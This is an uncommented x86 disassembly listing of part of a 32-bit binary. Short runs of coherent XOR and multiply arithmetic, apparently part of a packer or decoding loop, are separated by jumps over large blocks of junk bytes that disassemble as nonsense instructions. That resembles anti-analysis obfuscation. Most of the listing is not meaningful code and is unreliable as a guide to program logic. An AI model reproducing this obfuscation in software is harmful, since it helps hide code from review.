  402a43:	add    BYTE PTR [edx],dl
  402a45:	cli    
  402a46:	push   ss
  402a47:	(bad)  
  402a49:	loope  0x402a19
  402a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a4c:	jp     0x4029ee
  402a4e:	dec    esp
  402a4f:	cld    
  402a50:	int3   
  402a51:	fstp   QWORD PTR [ecx]
  402a54:	bound  esp,QWORD PTR [esi-0x38]
  402a57:	xchg   edx,eax
  402a58:	push   DWORD PTR [ecx]
  402a5a:	sbb    al,bh
  402a5c:	xor    bl,BYTE PTR [ecx-0x2f]
  402a5f:	sbb    al,0xce
  402a61:	push   es
  402a62:	cs in  eax,0xfa
  402a65:	add    al,0xe0
  402a67:	gs mov esi,0xa5441828
  402a6d:	fwait
  402a6e:	add    al,0x35
  402a70:	xor    WORD PTR [ecx+0x42],di
  402a74:	push   ebx
  402a75:	out    dx,al
  402a76:	mov    dl,0x9
  402a78:	popa   
  402a79:	xlat   BYTE PTR ds:[ebx]
  402a7a:	mov    ch,0x1b
  402a7c:	pop    ss
  402a7d:	add    DWORD PTR [eiz*2+0x6993d4a2],0xfc00f5cf
  402a88:	dec    esi
  402a89:	ins    BYTE PTR es:[edi],dx
  402a8a:	cmp    al,0x40
  402a8c:	mov    esi,DWORD PTR [ebx]
  402a8e:	das    
  402a8f:	dec    ecx
  402a90:	hlt    
  402a91:	and    al,BYTE PTR [ebx-0x71dc425b]
  402a97:	mov    dh,0xb5
  402a99:	pop    es
  402a9a:	arpl   WORD PTR [ecx],di
  402a9c:	in     al,dx
  402a9d:	mov    edi,0x27e13f1
  402aa2:	(bad)  
  402aa3:	cmp    al,0x28
  402aa5:	cmp    dl,BYTE PTR [ebx+ebp*1]
  402aa8:	xlat   BYTE PTR ds:[ebx]
  402aa9:	add    DWORD PTR [ebx],esi
  402aab:	clc    
  402aac:	add    edi,DWORD PTR [ebp-0x14]
  402aaf:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ab2:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ab9:	mov    dl,BYTE PTR [ebp+0xb]
  402abc:	mov    edi,DWORD PTR [ebp-0x18]
  402abf:	xor    edi,eax
  402ac1:	add    edi,DWORD PTR [ebp-0x14]
  402ac4:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ac7:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ace:	mov    edx,DWORD PTR [ebp-0x44]
  402ad1:	mov    edi,DWORD PTR [ebp-0xc]
  402ad4:	xor    edx,eax
  402ad6:	xor    edi,eax
  402ad8:	add    edx,ecx
  402ada:	add    edi,ecx
  402adc:	imul   edx,edi
  402adf:	add    edx,DWORD PTR [ebp-0x14]
  402ae2:	mov    DWORD PTR [ebp-0x14],edx
  402ae5:	mov    edx,DWORD PTR [ebp-0xc]
  402ae8:	mov    edi,DWORD PTR [ebp-0x24]
  402aeb:	xor    edx,eax
  402aed:	add    edx,ecx
  402aef:	jmp    0x402c0f
  402af4:	mov    dl,0x70
  402af6:	mov    bl,0x55
  402af8:	mov    ch,0x55
  402afa:	push   edx
  402afb:	adc    eax,DWORD PTR [edi+0x498f7684]
  402b01:	xchg   ecx,eax
  402b02:	xchg   esp,eax
  402b03:	sbb    al,0x9a
  402b05:	or     eax,0x7f717c7c
  402b0a:	jl     0x402b88
  402b0c:	or     eax,0x5bbc6110
  402b11:	and    bh,dl
  402b13:	call   0x6e32ec99
  402b18:	(bad)  
  402b19:	and    al,0x54
  402b1b:	mov    esp,0x2ab85d98
  402b20:	shl    DWORD PTR [edi-0x7e],cl
  402b23:	add    ah,BYTE PTR [edi-0x74]
  402b26:	jno    0x402ad6
  402b28:	mov    bh,0x6e
  402b2a:	(bad)  
  402b2b:	jbe    0x402b88
  402b2d:	xor    ch,BYTE PTR [edx]
  402b2f:	jmp    0xb7c6:0x2934b7fc
  402b36:	idiv   edx
  402b38:	lahf   
  402b39:	icebp  
  402b3a:	mov    edi,0x2c858cde
  402b3f:	mov    eax,DWORD PTR gs:[edi-0x6d35d958]
  402b46:	mov    esp,0xc0300f99
  402b4b:	sub    al,0x39
  402b4d:	adc    dl,ah
  402b4f:	cmp    ch,dl
  402b51:	pop    ss
  402b52:	cmp    al,ch
  402b54:	push   esi
  402b55:	cmp    ah,BYTE PTR [edi-0x7dd348d]
  402b5b:	repnz fidiv DWORD PTR [edx]
  402b5e:	adc    al,0x9
  402b60:	or     edi,DWORD PTR [ebx+0x2b]
  402b63:	in     al,0xb3
  402b65:	xlat   BYTE PTR ds:[ebx]
  402b66:	(bad)  
  402b67:	pop    ebx
  402b68:	mov    ds:0xf1681962,eax
  402b6d:	in     eax,0xa7
  402b6f:	mov    edx,0x3b9c8af7
  402b74:	fsub   QWORD PTR ds:0x76cf2d4e
  402b7a:	xchg   ecx,eax
  402b7b:	das    
  402b7c:	clc    
  402b7d:	adc    cl,BYTE PTR [eax-0x26f958be]
  402b83:	ss xchg edx,eax
  402b85:	inc    eax
  402b86:	dec    esp
  402b87:	aad    0x7b
  402b89:	in     eax,0xbf
  402b8b:	fdiv   QWORD PTR ds:[eax]
  402b8e:	or     ecx,esp
  402b90:	mov    WORD PTR [edx-0x2db1b4b0],?
  402b96:	sub    DWORD PTR [esi-0x22a72980],0xb3194947
  402ba0:	lds    ecx,FWORD PTR [eax+ecx*1]
  402ba3:	lock je 0x402c1c
  402ba6:	shr    BYTE PTR [ebx-0x797ad6c3],1
  402bac:	and    al,0x36
  402bae:	xor    eax,0xdf584ac6
  402bb3:	shl    DWORD PTR [esp+ebp*1+0x8],0xe1
  402bb8:	add    eax,0x5812dd22
  402bbd:	ror    BYTE PTR [edx+ebp*1-0x22acb450],0x72
  402bc5:	mov    BYTE PTR [eax+edi*4+0x56],bl
  402bc9:	stos   BYTE PTR es:[edi],al
  402bca:	sub    eax,0xdc37146f
  402bcf:	add    eax,0x64a9c8bf
  402bd4:	pushf  
  402bd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bd6:	aam    0x75
  402bd8:	stos   BYTE PTR es:[edi],al
  402bd9:	or     ebp,DWORD PTR [edi-0x33]
  402bdc:	fst    st(3)
  402bde:	rcl    BYTE PTR ds:[esi-0x45],0x2
  402be3:	push   esi
  402be4:	bound  edx,QWORD PTR [ecx+edx*1+0x2036fb6b]
  402beb:	add    eax,0x957bc5bd
  402bf0:	jg     0x402c4e
  402bf2:	push   edi
  402bf3:	loop   0x402c54
  402bf5:	push   ss
  402bf6:	aaa    
  402bf7:	cs test al,0xa7
  402bfa:	adc    al,0x41
  402bfc:	out    0x79,al
  402bfe:	lea    esi,[eax]
  402c00:	inc    ebx
  402c01:	jb     0x402b88
  402c03:	or     eax,0x677a8e75
  402c08:	pop    esi
  402c09:	xor    BYTE PTR [ecx-0x1c],ch
  402c0c:	daa    
  402c0d:	or     ah,BYTE PTR [ebx+0xf]
  402c10:	scas   eax,DWORD PTR es:[edi]
  402c11:	xlat   BYTE PTR ds:[ebx]
  402c12:	mov    edi,DWORD PTR [ebp-0xc]
  402c15:	xor    edi,eax
  402c17:	sub    edx,edi
  402c19:	mov    edi,DWORD PTR [ebp-0xc]
  402c1c:	mov    ebx,DWORD PTR [ebp-0x14]
  402c1f:	xor    edi,eax
  402c21:	add    edi,ecx
  402c23:	imul   edi,ebx
  402c26:	mov    ebx,DWORD PTR [ebp-0x18]
  402c29:	xor    ebx,eax
  402c2b:	sub    edx,ecx
  402c2d:	lea    edi,[edi+ebx*1+0x32729e]
  402c34:	cmp    edi,edx
  402c36:	jbe    0x40295a
  402c3c:	mov    edx,DWORD PTR [ebp-0xc]
  402c3f:	mov    edi,DWORD PTR [ebp-0x24]
  402c42:	xor    edx,eax
  402c44:	add    edx,ecx
  402c46:	imul   edx,edi
  402c49:	mov    edi,DWORD PTR [ebp-0x18]
  402c4c:	xor    edi,eax
  402c4e:	add    edx,edi
  402c50:	mov    edi,DWORD PTR [ebp-0x8]
  402c53:	lea    edx,[edx+edi*1+0x32729e]
  402c5a:	mov    DWORD PTR [ebp-0x8],edx
  402c5d:	mov    edx,DWORD PTR [ebp-0x20]
  402c60:	xor    edx,eax
  402c62:	mov    edi,0xffcd8d62
  402c67:	sub    edi,edx
  402c69:	add    edi,DWORD PTR [ebp-0x10]
  402c6c:	mov    edx,DWORD PTR [ebp-0x20]
  402c6f:	mov    ebx,DWORD PTR [ebp-0x8]
  402c72:	xor    edx,eax
  402c74:	add    edx,ecx
  402c76:	imul   edx,ebx
  402c79:	cmp    edx,edi
  402c7b:	jbe    0x40217b
  402c81:	pop    ebx
  402c82:	pop    edi
  402c83:	leave  
  402c84:	ret    0x8
  402c87:	push   ebp
  402c88:	mov    ebp,esp
  402c8a:	jmp    0x402d8c
  402c8f:	test   al,0x6e
  402c91:	iret   
  402c92:	clc    
  402c93:	fnstsw WORD PTR [ebp-0x55]
  402c96:	outs   dx,BYTE PTR ds:[esi]
  402c97:	ret    
  402c98:	popf   
  402c99:	aam    0x5e
  402c9b:	retf   0xd227
  402c9e:	stc    
  402c9f:	lahf   
  402ca0:	or     al,0x7c
  402ca2:	jl     0x402cf7
  402ca4:	jl     0x402d22
  402ca6:	jl     0x402c3d
  402ca8:	rol    edx,cl
  402caa:	add    ecx,ebx
  402cac:	sub    BYTE PTR [eax-0x364dae95],dl
  402cb2:	jge    0x402d2d
  402cb4:	call   0xb258:0x9823017
  402cbb:	adc    BYTE PTR [edi+0x5922f21],ch
  402cc1:	pop    ebx
  402cc2:	ja     0x402c64
  402cc4:	inc    edi
  402cc5:	lahf   
  402cc6:	int    0x8f
  402cc8:	ret    
  402cc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cca:	clc    
  402ccb:	and    al,BYTE PTR [edi]
  402ccd:	mov    al,0xdd
  402ccf:	hlt    
  402cd0:	xor    ch,0x70
  402cd3:	(bad)  
  402cd4:	js     0x402c99
  402cd6:	jbe    0x402c5e
  402cd8:	dec    ecx
  402cd9:	int    0x11
  402cdb:	mov    dh,0xd0
  402cdd:	sub    bh,BYTE PTR [ebx-0x63fbf99e]
  402ce3:	jne    0x402c7f
  402ce5:	xchg   DWORD PTR [esp+eax*2],eax
  402ce8:	mov    dl,0xfc
  402cea:	cmp    DWORD PTR [ebp+0x45],esi
  402ced:	retf   0xc031
  402cf0:	shl    BYTE PTR [ebx-0x2c13f80d],1
  402cf6:	shl    BYTE PTR [eiz*4+0x7819973a],1
  402cfd:	push   0xffffff92
  402cff:	retf   
  402d00:	gs iret 
  402d02:	xor    DWORD PTR [esi-0x5b],ecx
  402d05:	jnp    0x402d0f
  402d07:	cmc    
  402d08:	pop    edi
  402d09:	pop    ecx
  402d0a:	or     ebx,edi
  402d0c:	clc    
  402d0d:	inc    ebx
  402d0e:	jb     0x402d04
  402d10:	mov    ds:0xa73d3133,eax
  402d15:	pop    ebp
  402d16:	into   
  402d17:	jle    0x402d44
  402d19:	sbb    bh,0xd
  402d1c:	inc    ecx
  402d1d:	(bad)  
  402d1e:	fisttp DWORD PTR [edi-0x3cbdd35b]
  402d24:	push   edi
  402d25:	xchg   ebx,eax
  402d26:	ret    0x4000
  402d29:	(bad)  
  402d2a:	neg    cl
  402d2c:	jo     0x402cbd
  402d2e:	test   BYTE PTR [ecx+0x1ef58cac],cl
  402d34:	aaa    
  402d35:	shr    BYTE PTR [eax+0x6b],1
  402d38:	inc    edi
  402d39:	jbe    0x402cf6
  402d3b:	and    DWORD PTR [ecx-0xc],ecx
  402d3e:	jno    0x402d09
  402d40:	in     eax,dx
  402d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d42:	aad    0xd2
  402d44:	pop    eax
  402d45:	shl    BYTE PTR [eax-0x2b],0x8a
  402d49:	pop    ss
  402d4a:	enter  0x65d8,0x34
  402d4e:	mov    BYTE PTR [esi+0x53],bh
  402d51:	mov    eax,0x55579e98
  402d56:	mov    BYTE PTR [edi-0x67991e04],bl
  402d5c:	std    
  402d5d:	cmp    ecx,DWORD PTR [ecx+0x3f509f55]
  402d63:	ja     0x402d7e
  402d65:	xor    eax,0x223122cf
  402d6a:	loop   0x402d7f
  402d6c:	mov    al,ds:0x7629c483
  402d71:	pop    edx
  402d72:	fsub   QWORD PTR [esi+0x38714c7c]
  402d78:	sub    eax,0xd88397ac
  402d7d:	mov    bh,0x97
  402d7f:	out    dx,eax
  402d80:	xchg   ecx,eax
  402d81:	push   eax
  402d82:	aas    
  402d83:	scas   al,BYTE PTR es:[edi]
  402d84:	ss inc eax
  402d86:	fidiv  WORD PTR [ecx+0x41e77748]
  402d8c:	push   ecx
  402d8d:	and    edx,DWORD PTR ds:0x4275a8
  402d93:	push   ecx
  402d94:	and    DWORD PTR ds:0x427d1f,edi
  402d9a:	mov    eax,0xf89c8535
  402d9f:	mov    ecx,DWORD PTR ds:0x4278ab
  402da5:	mov    ecx,DWORD PTR [ecx]
  402da7:	xor    DWORD PTR ds:0x42c89a,ecx
  402dad:	mov    DWORD PTR [ebp-0x8],eax
  402db0:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402db7:	jmp    0x402eb9
  402dbc:	aas    
  402dbd:	enter  0x7aef,0xfb
  402dc1:	jge    0x402e10
  402dc3:	jge    0x402db3
  402dc5:	int    0x4c
  402dc7:	jae    0x402e43
  402dc9:	aam    0x3b
  402dcb:	xchg   ecx,eax
  402dcc:	haddps xmm7,XMMWORD PTR [ebx+edx*2+0x7c]
  402dd2:	jl     0x402e50
  402dd4:	test   BYTE PTR [ebp+0x6a7fceeb],al
  402dda:	fild   WORD PTR [ebp-0x624dc205]
  402de0:	clc    
  402de1:	inc    edx
  402de2:	aad    0xb8
  402de4:	sbb    DWORD PTR [ecx+0x18],ebp
  402de7:	inc    edx
  402de8:	mov    al,ds:0x895dc678
  402ded:	ins    DWORD PTR es:[edi],dx
  402dee:	push   ebx
  402def:	rol    DWORD PTR [ebx+0x6a5ea0c2],0xef
  402df6:	js     0x402ddb
  402df8:	out    dx,eax
  402df9:	cmp    edx,0x49e3b1f1
  402dff:	sub    cl,BYTE PTR [eax+0x8]
  402e02:	ja     0x402dd3
  402e04:	or     DWORD PTR ds:[edx],0x27b49a8f
  402e0b:	xor    esi,ebp
  402e0d:	pop    eax
  402e0e:	out    0xda,eax
  402e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e11:	popf   
  402e12:	idiv   BYTE PTR [ebp+0x64]
  402e15:	push   ecx
  402e16:	ins    BYTE PTR es:[edi],dx
  402e17:	add    al,0x5f
  402e19:	dec    edi
  402e1a:	add    DWORD PTR ds:0xa15e4bdc,esi
  402e20:	test   al,0xb9
  402e22:	jg     0x402de1
  402e24:	gs cdq 
  402e26:	retf   
  402e27:	and    al,0x84
  402e29:	pop    eax
  402e2a:	and    DWORD PTR [ebx-0x1465a30e],0xc40cc32e
  402e34:	imul   eax,DWORD PTR [edx],0xecc34f44
  402e3a:	adc    eax,0x5b39d2b2
  402e3f:	mov    bh,0x9
  402e41:	lds    ebp,FWORD PTR [edi-0x36]
  402e44:	add    bh,ch
  402e46:	push   esi
  402e47:	xchg   DWORD PTR [edx],eax
  402e49:	ret    0xa0b7
  402e4c:	add    eax,0xa6c0f2d3
  402e51:	xor    edx,esi
  402e53:	mov    dh,0xa0
  402e55:	icebp  
  402e56:	dec    ebx
  402e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e58:	rcl    esp,0xea
  402e5b:	loop   0x402e46
  402e5d:	jmp    0xc547d6e0
  402e62:	fcmovb st,st(3)
  402e64:	pop    ecx
  402e65:	dec    ebx
  402e66:	addr16 add ecx,eax
  402e69:	xor    eax,0xfd806add
  402e6e:	inc    esp
  402e6f:	or     eax,0xe0013ff8
  402e74:	xor    esp,DWORD PTR ds:0xffea337
  402e7a:	pop    ecx
  402e7b:	cmp    al,0x74
  402e7d:	in     eax,0x9b
  402e7f:	jno    0x402ea1
  402e81:	js     0x402e13
  402e83:	mov    esi,0x56a6893d
  402e88:	shl    esi,cl
  402e8a:	pop    edi
  402e8b:	sahf   
  402e8c:	jbe    0x402e77
  402e8e:	dec    ecx
  402e8f:	cdq    
  402e90:	je     0x402ee4
  402e92:	scas   eax,DWORD PTR es:[edi]
  402e93:	adc    al,0x2f
  402e95:	pop    edi
  402e96:	inc    eax
  402e97:	dec    edx
  402e98:	inc    esp
  402e99:	xchg   al,al
  402e9b:	clc    
  402e9c:	or     al,0xcd
  402e9e:	cmc    
  402e9f:	pusha  
  402ea0:	je     0x402e25
  402ea2:	mov    ebp,0xf27cb8a2
  402ea7:	int3   
  402ea8:	imul   esp,ebx,0x6c
  402eab:	jg     0x402e53
  402ead:	sub    al,0xca
  402eaf:	js     0x402e94
  402eb1:	out    0x52,al
  402eb3:	int3   
  402eb4:	(bad)  
  402eb5:	sub    esp,DWORD PTR [ecx+0x558bb286]
  402ebb:	clc    
  402ebc:	neg    DWORD PTR ds:0x4275a0
  402ec2:	push   esi
  402ec3:	jmp    0x402fc5
  402ec8:	xor    BYTE PTR [eax-0x3f],cl
  402ecb:	aaa    
  402ecc:	pop    ecx
  402ecd:	pop    ebp
  402ece:	fimul  DWORD PTR [ebx+0xf]
  402ed1:	mov    eax,ds:0x84c4860b
  402ed6:	daa    
  402ed7:	jo     0x402ec2
  402ed9:	push   cs
  402eda:	jl     0x402f58
  402edc:	push   ebx
  402edd:	jl     0x402f5b
  402edf:	jl     0x402f28
  402ee1:	jnp    0x402ec9
  402ee3:	cmp    edi,esi
  402ee5:	test   BYTE PTR [edx],ah
  402ee7:	xor    BYTE PTR [edi-0x53c332c4],bh
  402eed:	dec    edx
  402eee:	add    eax,0x94f30e8a
  402ef3:	lahf   
  402ef4:	mov    dl,0x8b
  402ef6:	jl     0x402f40
  402ef8:	xchg   edi,eax
  402ef9:	cmp    al,bh
  402efb:	add    ch,dl
  402efd:	cdq    
  402efe:	adc    eax,0xb5e00c09
  402f03:	setl   BYTE PTR [edx-0x4a]
  402f07:	jbe    0x402ea1
  402f09:	dec    eax
  402f0a:	arpl   WORD PTR [edi-0x61],dx
  402f0d:	mov    ecx,0xbadc1c35
  402f12:	ds fcomip st,st(4)
  402f15:	sub    DWORD PTR [ebp+0x68],0xffffff8e
  402f19:	out    dx,eax
  402f1a:	mov    dl,0xe6
  402f1c:	(bad)  
  402f1d:	lods   al,BYTE PTR ds:[esi]
  402f1e:	jae    0x402ee7
  402f20:	push   0x56343461
  402f25:	push   esi
  402f26:	push   edi
  402f27:	sub    DWORD PTR [esi-0x79],ebp
  402f2a:	adc    ebp,DWORD PTR [edi+0x5f]
  402f2d:	outs   dx,DWORD PTR ds:[esi]
  402f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f2f:	jp     0x402fa5
  402f31:	stos   BYTE PTR es:[edi],al
  402f32:	sub    DWORD PTR ds:0xab66f672,edx
  402f38:	xor    edx,edx
  402f3a:	cmp    bl,al
  402f3c:	iret   
  402f3d:	popf   
  402f3e:	jo     0x402ecc
  402f40:	icebp  
  402f41:	sub    DWORD PTR [ebx+edi*8-0x68],ebx
  402f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f46:	je     0x402ef7
  402f48:	pop    eax
  402f49:	cli    
  402f4a:	pop    esi
  402f4b:	(bad)  
  402f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f4d:	call   0x30a04631
  402f52:	mov    bh,0xb3
  402f54:	loope  0x402f86
  402f56:	clc    
  402f57:	mov    eax,ds:0x4d18cdcf
  402f5c:	mov    esi,0x24456bea
  402f61:	pop    esi
  402f62:	(bad)  
  402f64:	clc    
  402f65:	xchg   BYTE PTR [edi-0x71],bh
  402f68:	pop    ebx
  402f69:	in     al,dx
  402f6a:	sbb    DWORD PTR [eax+0xe],esp
  402f6d:	or     eax,0x25a1cd55
  402f72:	lea    ebx,[ecx+edi*4]
  402f75:	out    0xa3,eax
  402f77:	fsub   QWORD PTR [esi-0x793411fb]
  402f7d:	sub    eax,0x3240e87e
  402f82:	sahf   
  402f83:	repnz repz pop edx
  402f86:	mov    bl,0x3d
  402f88:	retf   
  402f89:	repz mov edi,0xe6cfc262
  402f8f:	je     0x402fc8
  402f91:	and    cl,BYTE PTR [edi]
  402f93:	arpl   WORD PTR [edi],dx
  402f95:	and    ebp,edx
  402f97:	cwde   
  402f98:	shl    DWORD PTR [esi-0x38],1
  402f9b:	sub    ebx,0xdf6b3f71
  402fa1:	nop
  402fa2:	jp     0x402f83
  402fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fa5:	retf   
  402fa6:	pop    es
  402fa7:	adc    DWORD PTR [ebx],edi
  402fa9:	ret    
  402faa:	or     eax,0x8e08ebcd
  402faf:	loop   0x40300c
  402fb1:	jne    0x402fb4
  402fb3:	or     bl,BYTE PTR [ebp-0x57f8d653]
  402fb9:	pop    ebp
  402fba:	ins    BYTE PTR es:[edi],dx
  402fbb:	out    0x0,al
  402fbd:	inc    edi
  402fbe:	jp     0x402f68
  402fc0:	mov    eax,ds:0x58911073
  402fc5:	mov    ecx,0x7510857
  402fca:	jmp    0x4030cc
  402fcf:	xlat   BYTE PTR ds:[ebx]
  402fd0:	push   ebp
  402fd1:	imul   ebp,DWORD PTR [eax+0x6d],0xe255ed68
  402fd8:	xor    ecx,DWORD PTR [ecx]
  402fda:	xchg   edx,eax
  402fdb:	jns    0x403012
  402fdd:	cmc    
  402fde:	jne    0x402fac
  402fe0:	add    DWORD PTR [esp+edi*2+0x53],edi
  402fe4:	jl     0x403062
  402fe6:	jl     0x402fab
  402fe8:	mov    bl,0x1d
  402fea:	mov    DWORD PTR [ebx-0x49],esp
  402fed:	mov    esp,0x33173111
  402ff2:	pop    esp
  402ff3:	mov    ebx,0x5df9729
  402ff8:	mov    WORD PTR [ebx],ds
  402ffa:	lahf   
  402ffb:	jle    0x40300e
  402ffd:	adc    DWORD PTR [ecx+0x1d68d631],edx
  403003:	pushf  
  403004:	arpl   WORD PTR [eax+0xdb8c225],sp
  40300a:	mov    esi,0xc7bc34
  40300f:	int3   
  403010:	sbb    BYTE PTR [edi],bl
  403012:	jmp    0x5a95:0xb3c27acc
  403019:	daa    
  40301a:	inc    ebp
  40301b:	or     al,0x5e
  40301d:	pusha  
  40301e:	jae    0x403076
  403020:	dec    ecx
  403021:	mov    ds:0xbdda86c1,al
  403026:	ret    
  403027:	call   0xb053f331
  40302c:	(bad)  
  40302d:	fistp  QWORD PTR [eax+eiz*8-0x5e7b8960]
  403034:	rol    DWORD PTR [ecx+eiz*2+0x18],0xb9
  403039:	sub    BYTE PTR [edi-0x753ca08e],bh
  40303f:	scas   eax,DWORD PTR es:[edi]
  403040:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403042:	pop    edi
  403043:	lods   eax,DWORD PTR ds:[esi]
  403044:	(bad)  [ebp-0x5e]
  403047:	daa    
  403048:	cmp    al,0x88
  40304a:	lock or dl,bl
  40304d:	mov    esp,0xc7c7dbe1
  403052:	retf   
  403053:	push   eax
  403054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403055:	pop    ebx
  403056:	lods   eax,DWORD PTR ds:[esi]
  403057:	mov    ch,0x37
  403059:	loope  0x403053
  40305b:	stos   BYTE PTR es:[edi],al
  40305c:	pop    esi
  40305d:	cmp    eax,0xd3181f76
  403062:	test   BYTE PTR [ecx-0xafca7e1],dl
  403068:	mov    ecx,0xab0f492a
  40306d:	cmp    eax,0x667cc71b
  403072:	out    0x88,al
  403074:	jge    0x403010
  403076:	mov    al,0xe6
  403078:	repz xlat BYTE PTR ds:[ebx]
  40307a:	(bad)  
  40307b:	jmp    0x403030
  40307d:	push   ss
  40307e:	ins    BYTE PTR es:[edi],dx
  40307f:	push   edi
  403080:	mov    ?,WORD PTR ds:0x47f2c8c3
  403086:	or     DWORD PTR [ebx+0x4816655d],edi
  40308c:	mov    bh,0xe4
  40308e:	sbb    al,BYTE PTR [ecx+0x7e]
  403091:	inc    esi
  403092:	inc    ebx
  403093:	sub    dh,cl
  403095:	dec    ecx
  403096:	fsubr  QWORD PTR [ecx+0x37488681]
  40309c:	scas   eax,DWORD PTR es:[edi]
  40309d:	int3   
  40309e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40309f:	mov    ds:0x6d8c4eff,eax
  4030a4:	adc    cl,BYTE PTR es:[ebx-0x35]
  4030a8:	outs   dx,BYTE PTR ds:[esi]
  4030a9:	push   0x16
  4030ab:	xchg   ecx,eax
  4030ac:	leave  
  4030ad:	mov    ah,0xad
  4030af:	imul   edi,DWORD PTR [edi+edx*1-0x24d99059],0x43
  4030b7:	pop    esi
  4030b8:	test   DWORD PTR [ecx+0x56],eax
  4030bb:	cld    
  4030bc:	sbb    al,0x28
  4030be:	dec    ebx
  4030bf:	sbb    al,0x87
  4030c1:	inc    ebx
  4030c2:	rol    dl,0x4e
  4030c5:	cmp    BYTE PTR [esi+0x71a24217],cl
  4030cb:	pushf  
  4030cc:	xor    edx,ecx
  4030ce:	mov    esi,DWORD PTR ds:0x4292a5
  4030d4:	or     DWORD PTR ds:0x4275a8,esi
  4030da:	mov    esi,0x32729e
  4030df:	push   edi
  4030e0:	mov    edi,DWORD PTR [ebp+0x10]
  4030e3:	sub    DWORD PTR ds:0x42c88e,0x427d17
  4030ed:	add    edx,esi
  4030ef:	cmp    edi,edx
  4030f1:	jmp    0x4031f3
  4030f6:	in     eax,0x90
  4030f8:	ds std 
  4030fa:	inc    ecx
  4030fb:	jge    0x4030fa
  4030fd:	test   al,0xb1
  4030ff:	test   BYTE PTR [ebx],0x86
  403102:	(bad)  
  403103:	aas    
  403104:	jnp    0x40315a
  403106:	and    eax,DWORD PTR [eax]
  403108:	jl     0x403186
  40310a:	push   ebx
  40310b:	jl     0x403189
  40310d:	jl     0x40317f
  40310f:	in     al,dx
  403110:	jmp    0xfd1b:0xb7af800
  403117:	and    bh,bl
  403119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40311a:	add    ah,dl
  40311c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40311d:	and    DWORD PTR [ecx-0x5dc5ac08],eax
  403123:	test   BYTE PTR [edx-0x7e],bh
  403126:	jmp    0x40316e
  403128:	rcl    DWORD PTR [eax],1
  40312a:	es add ch,dh
  40312d:	imul   ebp,DWORD PTR [ebp+0x7],0x74297774
  403134:	je     0x4030d2
  403136:	mov    bl,0x4e
  403138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403139:	and    esp,DWORD PTR gs:[edi-0x7a32f238]
  403140:	xchg   ebx,eax
  403141:	xchg   edi,eax
  403142:	push   esi
  403143:	mov    edi,0x400ee01a
  403148:	mov    al,0x8f
  40314a:	sbb    al,0x88
  40314c:	aaa    
  40314d:	std    
  40314e:	xchg   BYTE PTR [ecx+eax*4-0xe0a269d],ch
  403155:	je     0x403140
  403157:	mov    BYTE PTR [ebx-0x65],bh
  40315a:	es das 
  40315c:	fcom   DWORD PTR [esi]
  40315e:	clc    
  40315f:	and    bl,BYTE PTR [ebx+0x3f93267a]
  403165:	iret   
  403166:	out    dx,eax
  403167:	mov    dh,0xc0
  403169:	cmp    DWORD PTR [ecx-0x79beed0a],esp
  40316f:	shr    dl,0x46
  403172:	inc    ecx
  403173:	xor    eax,0xd6b1f164
  403178:	aas    
  403179:	cmp    esi,DWORD PTR [ecx-0x43]
  40317c:	or     DWORD PTR [ecx+0x2e],eax
  40317f:	push   ebx
  403180:	mov    dl,cl
  403182:	sbb    dl,dh
  403184:	add    ebp,DWORD PTR [esi+eiz*8]
  403187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403188:	push   ss
  403189:	repz xchg eax,esi
  40318c:	nop
  40318d:	neg    DWORD PTR [ecx+edi*2-0x22d35d67]
  403194:	arpl   WORD PTR [ecx-0x2c],di
  403197:	mov    ch,0xf8
  403199:	push   0x49
  40319b:	or     BYTE PTR [edi+0x4e],ch
  40319e:	inc    esp
  40319f:	add    edx,DWORD PTR [edx+0x650c6f52]
  4031a5:	(bad)  
  4031a6:	push   ss
  4031a7:	(bad)  
  4031a8:	retf   0xc3b2
  4031ab:	test   al,0x76
  4031ad:	xchg   edi,eax
  4031ae:	pushf  
  4031af:	in     eax,0x44
  4031b1:	sub    dl,BYTE PTR [ecx+0x3ece5d77]
  4031b7:	inc    edx
  4031b8:	pop    esp
  4031b9:	inc    ebx
  4031ba:	inc    edi
  4031bb:	and    BYTE PTR [ebx],dl
  4031bd:	mov    al,ds:0x8b4053a7
  4031c2:	dec    ecx
  4031c3:	jo     0x403188
  4031c5:	(bad)  
  4031c7:	push   ebx
  4031c8:	adc    al,0x2a
  4031ca:	dec    ecx
  4031cb:	push   es
  4031cc:	sub    BYTE PTR [ebx],0xbd
  4031cf:	mov    ebx,0xe4937bae
  4031d4:	xchg   esi,eax
  4031d5:	sub    al,0xc7
  4031d7:	les    edi,FWORD PTR [edx+0x68a661a8]
  4031dd:	xchg   edx,eax
  4031de:	mov    ah,0x90
  4031e0:	xchg   edx,eax
  4031e1:	dec    ebx
  4031e2:	sub    al,dl
  4031e4:	cmp    eax,0x216e180b
  4031e9:	adc    eax,0xe6f70227
  4031ee:	out    dx,al
  4031ef:	sbb    BYTE PTR [ebx+0x10],al
  4031f2:	ret    
  4031f3:	je     0x4034f0
  4031f9:	adc    edi,DWORD PTR ds:0x4292c1
  4031ff:	mov    edx,DWORD PTR [ebp-0x8]
  403202:	mov    eax,DWORD PTR [ebp-0x4]
  403205:	xor    eax,ecx
  403207:	and    DWORD PTR ds:0x4275a0,0x0
  403211:	jmp    0x403223
  403216:	mov    edi,DWORD PTR ds:0x4275a0
